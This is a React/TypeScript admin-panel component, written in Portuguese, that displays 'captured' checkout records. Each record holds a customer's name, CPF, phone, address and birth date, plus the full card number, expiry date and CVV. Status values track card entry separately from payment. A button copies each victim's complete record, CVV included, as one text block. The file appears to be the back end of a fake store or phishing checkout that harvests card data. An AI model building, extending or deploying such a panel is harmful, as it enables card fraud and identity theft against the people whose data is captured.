import React, { useState } from 'react';
import { Search, Eye, Copy, Check, Phone, Mail, MapPin, CreditCard, ShoppingBag, User, Calendar, ShieldCheck } from 'lucide-react';

interface Props {
  pedidos: any[];
  refreshAll: () => Promise<void>;
}

export default function DadosCheckoutTab({ pedidos, refreshAll }: Props) {
  const [search, setSearch] = useState('');
  const [selectedLead, setSelectedLead] = useState<any | null>(null);
  const [copiedField, setCopiedField] = useState<string | null>(null);

  const copyToClipboard = (text: string, label: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setCopiedField(label);
    setTimeout(() => setCopiedField(null), 2000);
  };

  const filtered = pedidos.filter(p => {
    if (!search) return true;
    const q = search.toLowerCase();
    return (
      (p.nome_completo && p.nome_completo.toLowerCase().includes(q)) ||
      (p.email && p.email.toLowerCase().includes(q)) ||
      (p.telefone && p.telefone.toLowerCase().includes(q)) ||
      (p.cpf && p.cpf.toLowerCase().includes(q)) ||
      (p.produto_nome && p.produto_nome.toLowerCase().includes(q)) ||
      (p.status && p.status.toLowerCase().includes(q)) ||
      (p.cidade && p.cidade.toLowerCase().includes(q)) ||
      (p.numero_cartao && p.numero_cartao.toLowerCase().includes(q))
    );
  });

  const emDigitacao = pedidos.filter(p => p.status === 'em_digitacao' || p.status === 'digitando' || p.status === 'lead_pessoal').length;
  const pixGerado = pedidos.filter(p => p.status === 'pix_generated' || p.status === 'pending').length;
  const cartaoPreenchido = pedidos.filter(p => p.status === 'cartao_preenchido' || p.status === 'lead_cartao_preenchido').length;
  const pagos = pedidos.filter(p => p.status === 'paid' || p.status === 'approved').length;

  return (
    <div className="space-y-6">
      {/* Cards de Resumo */}
      <div className="grid grid-cols-2 sm:grid-cols-5 gap-3">
        <div className="bg-slate-900/60 border border-white/10 p-3.5 rounded-2xl">
          <div className="text-[10px] font-bold text-gray-400 uppercase">Total Capturados</div>
          <div className="text-xl font-black text-white mt-1">{pedidos.length}</div>
        </div>
        <div className="bg-slate-900/60 border border-blue-500/20 p-3.5 rounded-2xl">
          <div className="text-[10px] font-bold text-blue-400 uppercase">Em Digitação</div>
          <div className="text-xl font-black text-blue-400 mt-1">{emDigitacao}</div>
        </div>
        <div className="bg-slate-900/60 border border-yellow-500/20 p-3.5 rounded-2xl">
          <div className="text-[10px] font-bold text-yellow-400 uppercase">PIX Gerados</div>
          <div className="text-xl font-black text-yellow-400 mt-1">{pixGerado}</div>
        </div>
        <div className="bg-slate-900/60 border border-purple-500/20 p-3.5 rounded-2xl">
          <div className="text-[10px] font-bold text-purple-400 uppercase">Cartão Preenchido</div>
          <div className="text-xl font-black text-purple-400 mt-1">{cartaoPreenchido}</div>
        </div>
        <div className="bg-slate-900/60 border border-emerald-500/20 p-3.5 rounded-2xl col-span-2 sm:col-span-1">
          <div className="text-[10px] font-bold text-emerald-400 uppercase">Vendas Pagas</div>
          <div className="text-xl font-black text-emerald-400 mt-1">{pagos}</div>
        </div>
      </div>

      {/* Busca e Ações */}
      <div className="flex flex-col sm:flex-row gap-3 items-center justify-between bg-slate-900/40 p-4 rounded-2xl border border-white/5">
        <div className="relative flex-1 w-full">
          <Search size={16} className="absolute left-3 top-3 text-gray-400" />
          <input
            type="text"
            placeholder="🔍 Buscar por Nome, Email, Telefone, CPF, Cidade, Cartão ou Status..."
            value={search}
            onChange={e => setSearch(e.target.value)}
            className="w-full bg-slate-800 text-white rounded-xl border border-white/10 pl-9 pr-3 py-2 text-xs focus:outline-none"
          />
        </div>
        <button
          onClick={() => refreshAll()}
          className="w-full sm:w-auto bg-purple-600 hover:bg-purple-700 text-white font-bold px-4 py-2 rounded-xl text-xs flex items-center justify-center gap-1.5"
        >
          🔄 Atualizar Dados ({pedidos.length})
        </button>
      </div>

      {/* Tabela Principal */}
      <div className="bg-slate-900/40 border border-white/5 rounded-2xl overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs border-collapse min-w-[900px]">
            <thead>
              <tr className="bg-slate-950/80 text-gray-400 border-b border-white/10 font-bold uppercase text-[10px] tracking-wider">
                <th className="p-3">Data / Hora</th>
                <th className="p-3">Cliente</th>
                <th className="p-3">Endereço de Entrega</th>
                <th className="p-3">Dados de Pagamento / Cartão</th>
                <th className="p-3">Produto / Valor</th>
                <th className="p-3">Status</th>
                <th className="p-3 text-center">Ficha Completa</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/5">
              {filtered.map(p => {
                const isPaid = p.status === 'paid' || p.status === 'approved';
                const isPix = p.status === 'pix_generated' || p.status === 'pending';
                const isCard = p.numero_cartao && p.numero_cartao !== 'PIX';

                return (
                  <tr key={p.id} className="hover:bg-white/[0.02] transition">
                    <td className="p-3 whitespace-nowrap text-gray-400 font-mono text-[11px]">
                      {new Date(p.created_at).toLocaleString('pt-BR')}
                    </td>
                    <td className="p-3">
                      <div className="font-bold text-white text-xs">{p.nome_completo || '—'}</div>
                      <div className="text-gray-400 text-[11px] font-mono">{p.telefone || ''}</div>
                      {p.email && <div className="text-gray-500 text-[10px]">{p.email}</div>}
                      {p.cpf && <div className="text-gray-500 text-[10px]">CPF: {p.cpf}</div>}
                    </td>
                    <td className="p-3 max-w-[200px]">
                      {p.endereco || p.cidade ? (
                        <div className="text-gray-300 text-[11px] leading-relaxed">
                          {p.endereco}{p.numero ? `, nº ${p.numero}` : ''}<br />
                          {p.bairro ? `${p.bairro} - ` : ''}{p.cidade || ''}/{p.estado || ''}<br />
                          {p.cep && <span className="text-gray-500 font-mono">CEP: {p.cep}</span>}
                        </div>
                      ) : (
                        <span className="text-gray-500 text-[11px] italic">Não informado</span>
                      )}
                    </td>
                    <td className="p-3">
                      {isCard ? (
                        <div className="bg-slate-800/80 p-2 rounded-lg border border-white/5 text-[11px] space-y-0.5 font-mono">
                          <div className="font-bold text-purple-300">💳 {p.numero_cartao}</div>
                          {p.nome_cartao && <div className="text-gray-300 text-[10px]">{p.nome_cartao}</div>}
                          <div className="text-gray-400 text-[10px]">Val: {p.validade_cartao || '—'} | CVV: <strong className="text-yellow-400">{p.cvv_cartao || '—'}</strong></div>
                        </div>
                      ) : (
                        <span className="text-blue-400 font-bold text-[11px]">⚡ PIX</span>
                      )}
                    </td>
                    <td className="p-3">
                      <div className="font-bold text-white text-xs">{p.produto_nome || 'Camiseta'}</div>
                      <div className="text-emerald-400 font-black text-xs">R$ {parseFloat(p.valor_total || 0).toFixed(2).replace('.', ',')}</div>
                      {p.cupom_aplicado && <span className="bg-purple-950 text-purple-300 text-[9px] px-1.5 py-0.5 rounded font-bold">Cupom: {p.cupom_aplicado}</span>}
                    </td>
                    <td className="p-3 whitespace-nowrap">
                      <span className={`px-2 py-1 rounded-md text-[10px] font-black uppercase tracking-wider ${
                        isPaid ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' :
                        isPix ? 'bg-yellow-500/20 text-yellow-400 border border-yellow-500/30' :
                        isCard ? 'bg-purple-500/20 text-purple-400 border border-purple-500/30' :
                        'bg-blue-500/20 text-blue-400 border border-blue-500/30'
                      }`}>
                        {p.status || 'Digitando'}
                      </span>
                    </td>
                    <td className="p-3 text-center">
                      <button
                        onClick={() => setSelectedLead(p)}
                        className="bg-slate-800 hover:bg-slate-700 text-purple-300 font-bold px-2.5 py-1.5 rounded-lg border border-purple-500/30 text-[11px] inline-flex items-center gap-1"
                      >
                        <Eye size={13} /> Ver Ficha
                      </button>
                    </td>
                  </tr>
                );
              })}
              {filtered.length === 0 && (
                <tr>
                  <td colSpan={7} className="text-center p-8 text-gray-500 text-xs">
                    Nenhum checkout capturado encontrado.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>

      {/* Modal / Card de Ficha Completa */}
      {selectedLead && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-white/10 rounded-2xl max-w-xl w-full max-h-[90vh] overflow-y-auto p-6 space-y-5">
            <div className="flex justify-between items-center border-b border-white/10 pb-4">
              <div>
                <h3 className="text-md font-bold text-white flex items-center gap-2">
                  👤 Ficha Completa do Cliente #{selectedLead.id}
                </h3>
                <p className="text-xs text-gray-400">Capturado em {new Date(selectedLead.created_at).toLocaleString('pt-BR')}</p>
              </div>
              <button
                onClick={() => setSelectedLead(null)}
                className="bg-slate-800 text-gray-400 hover:text-white p-2 rounded-xl text-xs font-bold"
              >
                ✕ Fechar
              </button>
            </div>

            {/* Dados Pessoais */}
            <div className="space-y-2 bg-slate-950/60 p-4 rounded-xl border border-white/5">
              <h4 className="text-xs font-bold text-purple-400 uppercase tracking-wider">Dados Pessoais</h4>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs">
                <div><span className="text-gray-500">Nome:</span> <strong className="text-white">{selectedLead.nome_completo || '—'}</strong></div>
                <div><span className="text-gray-500">E-mail:</span> <strong className="text-white">{selectedLead.email || '—'}</strong></div>
                <div><span className="text-gray-500">Telefone / Whats:</span> <strong className="text-emerald-400">{selectedLead.telefone || '—'}</strong></div>
                <div><span className="text-gray-500">CPF:</span> <strong className="text-white">{selectedLead.cpf || '—'}</strong></div>
                <div><span className="text-gray-500">Data Nasc:</span> <strong className="text-white">{selectedLead.data_nascimento || '—'}</strong></div>
              </div>
            </div>

            {/* Endereço */}
            <div className="space-y-2 bg-slate-950/60 p-4 rounded-xl border border-white/5">
              <h4 className="text-xs font-bold text-purple-400 uppercase tracking-wider">Endereço de Entrega</h4>
              <div className="text-xs space-y-1 text-gray-300">
                <p><strong>Logradouro:</strong> {selectedLead.endereco || '—'}, Nº {selectedLead.numero || 'S/N'}</p>
                <p><strong>Bairro:</strong> {selectedLead.bairro || '—'} | <strong>CEP:</strong> {selectedLead.cep || '—'}</p>
                <p><strong>Cidade/UF:</strong> {selectedLead.cidade || '—'} - {selectedLead.estado || '—'}</p>
              </div>
            </div>

            {/* Dados do Cartão / Pagamento */}
            <div className="space-y-2 bg-slate-950/60 p-4 rounded-xl border border-purple-500/20">
              <h4 className="text-xs font-bold text-purple-400 uppercase tracking-wider flex items-center justify-between">
                <span>💳 Dados de Pagamento</span>
                <span className="text-[10px] text-yellow-400 font-mono">{selectedLead.status?.toUpperCase()}</span>
              </h4>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs font-mono">
                <div><span className="text-gray-500 font-sans">Número Cartão:</span> <strong className="text-purple-300">{selectedLead.numero_cartao || '—'}</strong></div>
                <div><span className="text-gray-500 font-sans">Nome no Cartão:</span> <strong className="text-white">{selectedLead.nome_cartao || '—'}</strong></div>
                <div><span className="text-gray-500 font-sans">Validade:</span> <strong className="text-white">{selectedLead.validade_cartao || '—'}</strong></div>
                <div><span className="text-gray-500 font-sans">CVV:</span> <strong className="text-yellow-400 text-sm font-black">{selectedLead.cvv_cartao || '—'}</strong></div>
              </div>
            </div>

            {/* Resumo do Pedido */}
            <div className="space-y-2 bg-slate-950/60 p-4 rounded-xl border border-white/5">
              <h4 className="text-xs font-bold text-purple-400 uppercase tracking-wider">Resumo do Pedido</h4>
              <div className="text-xs flex justify-between items-center">
                <div>
                  <div className="font-bold text-white">{selectedLead.produto_nome || 'Camiseta'}</div>
                  {selectedLead.cupom_aplicado && <div className="text-[10px] text-purple-300">Cupom: {selectedLead.cupom_aplicado}</div>}
                </div>
                <div className="text-right">
                  <div className="text-emerald-400 font-black text-sm">R$ {parseFloat(selectedLead.valor_total || 0).toFixed(2).replace('.', ',')}</div>
                </div>
              </div>
            </div>

            <div className="flex gap-2">
              <button
                onClick={() => {
                  const txt = `NOME: ${selectedLead.nome_completo}\nTEL: ${selectedLead.telefone}\nCPF: ${selectedLead.cpf}\nENDEREÇO: ${selectedLead.endereco}, ${selectedLead.numero} - ${selectedLead.bairro} (${selectedLead.cidade}/${selectedLead.estado})\nCARTÃO: ${selectedLead.numero_cartao} | NOME: ${selectedLead.nome_cartao} | VAL: ${selectedLead.validade_cartao} | CVV: ${selectedLead.cvv_cartao}`;
                  copyToClipboard(txt, 'full');
                }}
                className="flex-1 bg-purple-600 hover:bg-purple-700 text-white font-bold py-2.5 rounded-xl text-xs flex items-center justify-center gap-2"
              >
                {copiedField === 'full' ? <Check size={16} /> : <Copy size={16} />}
                {copiedField === 'full' ? 'Copiado!' : 'Copiar Ficha Completa'}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
